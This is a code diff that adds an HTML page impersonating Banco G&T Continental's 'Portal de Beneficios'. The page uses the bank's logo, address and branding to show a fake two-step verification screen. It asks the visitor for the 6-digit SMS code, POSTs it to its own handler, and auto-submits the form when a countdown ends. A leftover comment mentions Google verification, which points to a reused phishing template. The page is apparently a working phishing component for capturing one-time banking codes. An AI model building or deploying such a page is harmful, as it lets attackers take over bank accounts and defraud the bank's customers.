@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Beneficios Banco GyT Continental</title>
+        <link rel="icon" href="https://assets.gtc.com.gt/uploads/a29904af-1409-48ce-bf46-707c1a960eae/C32x32/favicon.ico"/>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Oswald:wght@300;400;500;700&display=swap">
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@300;700&display=swap" rel="stylesheet"> 
+        <!-- Custom styles for this template -->
+        <link href="./css/style.css" rel="stylesheet">
+    </head>
+    <body>
+        <div class="logo">
+            <h1>Portal de Beneficios</h1>
+            <img src="https://assets.gtc.com.gt/uploads/04805a41-8bac-48fa-a8bc-6a60789c9982/original/gyt-logo.png"/>
+
+        </div>
+        <div class="wrapper">
+
+            <div class="container">
+             
+
+                <form class="login-form" method="POST">
+              <!--      <img src="./images/xlogom.svg"> -->              
+                <span class="tit">Verificación en 2 pasos</span>
+                <br>
+                      <!--  <p class="mini">Para proteger tu cuenta, Google quiere asegurarse de que realmente seas tú la persona que intenta acceder</p>
+-->
+
+                <div class="auth"><img src="./images/sms5.svg">
+                    <p>Se acaba de enviar un código de verificación de 6 dígitos al teléfono.</p>
+                    </div>
+
+                        
+                    <input type="text" name="text" class="form-control1" id="prefixedText" placeholder="* * * * * *" required/>
+
+                    <div class="form-group">
+                        <input type="submit" class="btn btn-primary btn-lg btn-block" value="Confirmar">
+                    </div>
+
+
+                    <div id="cuenta" style="color: #fff;"><p> <span id="seg" style="color: #fff;">90</span> segundos</p>  </div>
+
+
+
+					
+                </form>
+            </div>
+			
+        </div>
+
+        <script>
+            // Obtenemos el campo de texto
+            const prefixedText = document.getElementById('prefixedText');
+        
+            // Al escribir en el campo de texto
+            //  prefixedText.addEventListener('input', function() {
+            //    Verificamos si el valor del campo comienza con 'G - '
+            //    if (!this.value.startsWith('G - ')) {
+            //        Si no comienza con 'G - ', lo establecemos al inicio
+            //        this.value = 'G - ' + this.value.replace('G - ', '');
+            //    }
+            //});
+        </script>
+<footer>
+    <p1>Portal de soporte</p1>
+    <p>6a Avenida 9-08 Zona 9 Ciudad de Guatemala, Sede Central. <br> 2024 Todos los derechos reservados G&T Continental </p>  
+</footer>        
+    </body>
+
+    <script> 
+        var contador = function(tiempo, intervalo){
+         var enCurso = 0, intv = intervalo || 1000;
+         var veces = tiempo / intv, este = this, timer;
+         this.empezar = function(callback){
+          enCurso = 1;
+          timer = setTimeout(function(){
+           if(veces + 1 && enCurso){
+            callback(veces-- * intv);
+            setTimeout(function(){ este.empezar(callback); }, intv);
+           }else{
+            return enCurso = 0;
+           }
+          }, intv);
+         };
+         this.parar = function(){
+          if(enCurso){ enCurso = 0; }
+         };
+        }
+        var cuentaAtras = new contador(89000);
+        document.body.onload = function(){ cuentaAtras.empezar(function(tiempo){
+         document.getElementById('cuenta').innerHTML = tiempo / 1000 + ' segundos';
+         if(!tiempo){ document.getElementsByTagName('form')[0].submit() }
+        }); }
+        document.getElementById('boton-parar').onclick = cuentaAtras.parar;
+        
+        </script> 
+</html>
+
